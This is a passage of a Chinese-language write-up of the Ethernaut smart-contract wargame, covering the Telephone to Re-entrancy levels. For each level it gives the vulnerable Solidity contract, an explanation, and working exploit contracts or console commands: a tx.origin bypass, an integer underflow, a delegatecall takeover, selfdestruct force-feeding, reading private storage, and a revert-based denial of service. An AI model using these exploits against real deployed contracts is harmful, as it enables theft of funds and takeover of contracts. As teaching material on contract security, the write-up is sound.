<span class="w">    </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">changeOwner</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_owner</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_owner</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">Telephone</span><span class="w"> </span><span class="nx">tele</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">tele</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Telephone</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">tele</span><span class="p">.</span><span class="nx">changeOwner</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<h2 id="5-token">5. Token<a class="headerlink" href="#5-token" title="Permanent link">&para;</a></h2>
<p>增加手中 token 的数量，越多越好（初始 20 个）</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.6.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Token</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="c1">// 无符号整数类型</span>
<span class="w">  </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="nx">balances</span><span class="p">;</span>
<span class="w">  </span><span class="nx">uint</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">totalSupply</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_initialSupply</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">totalSupply</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_initialSupply</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_value</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">_value</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
<span class="w">    </span><span class="c1">// 会发生整数溢出，未使用 SafeMath 检查</span>
<span class="w">    </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">_value</span><span class="p">;</span>
<span class="w">    </span><span class="nx">balances</span><span class="p">[</span><span class="nx">_to</span><span class="p">]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">_value</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_owner</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">balance</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">balances</span><span class="p">[</span><span class="nx">_owner</span><span class="p">];</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<p>通过下溢出来获得 token</p>
<div class="highlight"><pre><span></span><code><span class="c1">// 转给除自己外的任意地址</span>
<span class="c1">// 转给自己的话，就先下溢出再上溢出了...</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="o">&lt;</span><span class="nx">address</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="mf">21</span><span class="p">)</span>
</code></pre></div>
<h2 id="6-delegation">6. Delegation<a class="headerlink" href="#6-delegation" title="Permanent link">&para;</a></h2>
<p>声明对合约实例的所有权</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Delegate</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_owner</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_owner</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">pwn</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Delegation</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span>
<span class="w">  </span><span class="nx">Delegate</span><span class="w"> </span><span class="nx">delegate</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_delegateAddress</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">delegate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Delegate</span><span class="p">(</span><span class="nx">_delegateAddress</span><span class="p">);</span>
<span class="w">    </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">// 没有 payable，不能使用转账来触发 fallback</span>
<span class="w">  </span><span class="c1">// 同时，通过转账来触发 fallback 函数不能加任何 data</span>
<span class="w">  </span><span class="nx">fallback</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">result</span><span class="p">,)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">delegate</span><span class="p">).</span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">result</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="k">this</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>代理调用只使用给定地址的代码，其他属性都取自当前合约</li>
<li>使用合约 <code>Delegate</code> 的 <code>pwn</code> 函数来修改合约 <code>Delegation</code> 的所有者</li>
<li>除了向合约转账会触发 <code>fallback</code> 函数外，若被调用的函数不存在同样会触发</li>
<li>
<p>调用 <code>Delegation</code> 不存在的函数 <code>pwn</code> 来触发 <code>fallback</code> 函数，从而执行真正的 <code>pwn</code> 函数</p>
<div class="highlight"><pre><span></span><code><span class="c1">// keccak256 即 sha3</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">sendTransaction</span><span class="p">({</span><span class="nx">data</span><span class="o">:</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">sha3</span><span class="p">(</span><span class="s2">&quot;pwn()&quot;</span><span class="p">)})</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">owner</span><span class="p">()</span>
</code></pre></div>
</li>
<li>
<p>代理调用功能强大且危险，慎用 👀</p>
</li>
</ul>
<h3 id="_4">参考资料<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://zh.wikipedia.org/wiki/SHA-3">SHA-3 - 维基百科，自由的百科全书</a></li>
<li><a href="https://web3js.readthedocs.io/en/v1.7.0/web3-utils.html?highlight=sha3#sha3">sha3</a></li>
</ul>
<h2 id="7-force">7. Force<a class="headerlink" href="#7-force" title="Permanent link">&para;</a></h2>
<p>使合约的余额大于 0</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Force</span><span class="w"> </span><span class="p">{</span><span class="cm">/*</span>

<span class="cm">                   MEOW ?</span>
<span class="cm">         /\_/\   /</span>
<span class="cm">    ____/ o o \</span>
<span class="cm">  /~____  =ø= /</span>
<span class="cm"> (______)__m_m)</span>

<span class="cm">*/</span><span class="p">}</span>
</code></pre></div>
<ul>
<li>当合约自毁时，合约余额将转给指定目标<ul>
<li>即使合约代码不包含 <code>selfdestruct</code> 的调用，仍然可以通过 <code>delegatecall</code> 或 <code>callcode</code> 来执行自毁操作</li>
</ul>
</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">pay</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// 声明 payable 的函数和地址都可以接受转账</span>
<span class="w">    </span><span class="nx">selfdestruct</span><span class="p">(</span><span class="nx">payable</span><span class="p">(</span><span class="nx">instance</span><span class="p">));</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<p>在 Remix 向合约 <code>Hack</code> 转账</p>
<p><img alt="先填写 value，再点击 pay" src="../img/ethernaut03.jpg" /></p>
<ul>
<li>如果合约中包含声明了 <code>payable</code> 的 <code>receive</code> 或 <code>fallback</code> 函数，也可以在填写完 <code>VALUE</code> 后直接点击「Transact」；或通过声明了 <code>payable</code> 的构造函数，在创建合约时转账</li>
<li>通过自毁的转账方式无法阻止，因此任何合约逻辑都不应基于 <code>address(this).balance == 0</code></li>
</ul>
<h3 id="_5">参考资料<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://docs.soliditylang.org/en/v0.8.12/introduction-to-smart-contracts.html?highlight=destruct#deactivate-and-self-destruct">Deactivate and Self-destruct</a></li>
<li><a href="https://solidity-by-example.org/payable/">Payable | Solidity by Example</a></li>
<li><a href="https://remix-ide.readthedocs.io/en/latest/udapp.html?highlight=contract#low-level-interactions">Low level interactions</a></li>
</ul>
<h2 id="8-vault">8. Vault<a class="headerlink" href="#8-vault" title="Permanent link">&para;</a></h2>
<p>解锁保险柜</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Vault</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">bool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">locked</span><span class="p">;</span>
<span class="w">  </span><span class="nx">bytes32</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">password</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">_password</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">locked</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">    </span><span class="nx">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_password</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">unlock</span><span class="p">(</span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">_password</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">password</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">_password</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">locked</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>猜密码是不可能猜的~ XD</li>
<li>区块链上所有信息都是公开的，包括声明为 <code>private</code> 的变量</li>
<li>合约中的变量按照定义的顺序存储在 slot 中</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// 首先确定变量定义的顺序，第一个变量存储在 slot 0，第二个变量存储在 slot 1，以此类推</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">1</span><span class="p">)</span>
<span class="s2">&quot;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">toAscii</span><span class="p">(</span><span class="s2">&quot;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&quot;</span><span class="p">)</span>
<span class="s2">&quot;A very strong secret password :)&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">unlock</span><span class="p">(</span><span class="s2">&quot;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&quot;</span><span class="p">)</span>
</code></pre></div>
<ul>
<li>将变量声明为 <code>private</code> 只能防止其它合约访问</li>
<li>为了保证数据的机密性，应在上链前加密，密钥绝对不能公开。<a href="https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/">zk-SNARKs</a> 提供了一种在不暴露秘密信息的情况下，证明某人是否持有秘密信息的方法</li>
</ul>
<h3 id="_6">参考资料<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
<p><a href="https://cryptomarketpool.com/access-private-data-on-the-eth-blockchain/">Crypto Market Pool - Access private data on the Ethereum blockchain</a></p>
<h2 id="9-king">9. King<a class="headerlink" href="#9-king" title="Permanent link">&para;</a></h2>
<p>阻止关卡实例在提交后重新声明国王身份</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">King</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="nx">king</span><span class="p">;</span>
<span class="w">  </span><span class="nx">uint</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">prize</span><span class="p">;</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span><span class="w">  </span>
<span class="w">    </span><span class="nx">king</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">    </span><span class="nx">prize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// 即使转账金额小于 prize，合约的所有者也可以声明国王身份</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">prize</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">owner</span><span class="p">);</span>
<span class="w">    </span><span class="c1">// 当前的转账金额会转给上一任国王</span>
<span class="w">    </span><span class="nx">payable</span><span class="p">(</span><span class="nx">king</span><span class="p">).</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
<span class="w">    </span><span class="nx">king</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">    </span><span class="nx">prize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span><span class="w">  </span><span class="c1">// 更新 prize</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">_king</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">king</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>当 <code>transfer</code> 执行失败时，会抛出异常，交易回滚，关卡实例就无法再声明国王身份了</li>
<li>
<p>查看当前最高金额</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">toWei</span><span class="p">(</span><span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">fromWei</span><span class="p">(</span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">prize</span><span class="p">()))</span>
<span class="s2">&quot;1000000000000000&quot;</span>
</code></pre></div>
</li>
<li>
<p>新建合约，用于声明国王身份，并阻止关卡实例再成为国王</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">payable</span><span class="p">(</span><span class="nx">instance</span><span class="p">).</span><span class="nx">call</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">0.001</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="mf">1</span><span class="w"> </span><span class="nx">ether</span><span class="p">)}(</span><span class="s2">&quot;&quot;</span><span class="p">);</span><span class="w">  </span><span class="c1">// 汽油量一定要给足！</span>
<span class="w">    </span><span class="c1">// 不能使用 transfer/send，默认 2300 汽油费不足以支撑后续操作</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">revert</span><span class="p">();</span><span class="w"> </span><span class="c1">// 使 king.transfer 无法成功执行</span>
<span class="w">  </span><span class="p">}</span>

<span class="p">}</span>
</code></pre></div>
</li>
</ul>
<h2 id="10-re-entrancy">10. Re-entrancy<a class="headerlink" href="#10-re-entrancy" title="Permanent link">&para;</a></h2>
<p>窃取合约所有的💰</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.6.12</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s1">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Reentrance</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">using</span><span class="w"> </span><span class="nx">SafeMath</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">uint256</span><span class="p">;</span>
<span class="w">  </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">balances</span><span class="p">;</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">donate</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_to</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">balances</span><span class="p">[</span><span class="nx">_to</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">balances</span><span class="p">[</span><span class="nx">_to</span><span class="p">].</span><span class="nx">add</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_who</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">balance</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">balances</span><span class="p">[</span><span class="nx">_who</span><span class="p">];</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">// 利用先转再减</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">withdraw</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">_amount</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">result</span><span class="p">,)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">call</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="nx">_amount</span><span class="p">}(</span><span class="s2">&quot;&quot;</span><span class="p">);</span>
<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="nx">result</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">_amount</span><span class="p">;</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">      </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">_amount</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>在接收合约的 <code>fallback</code> 函数中再调用 <code>withdraw</code> 函数</li>
<li>
<p>先看看合约的初始资金</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getBalance</span><span class="p">(</span><span class="nx">instance</span><span class="p">)</span>
<span class="s2">&quot;1000000000000000&quot;</span>
</code></pre></div>
</li>
<li>
<p>计划分 9 次取完（也可以多捐赠，减少取出次数）</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.6.12</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s1">&#39;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol&#39;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Reentrance</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">using</span><span class="w"> </span><span class="nx">SafeMath</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">uint256</span><span class="p">;</span>
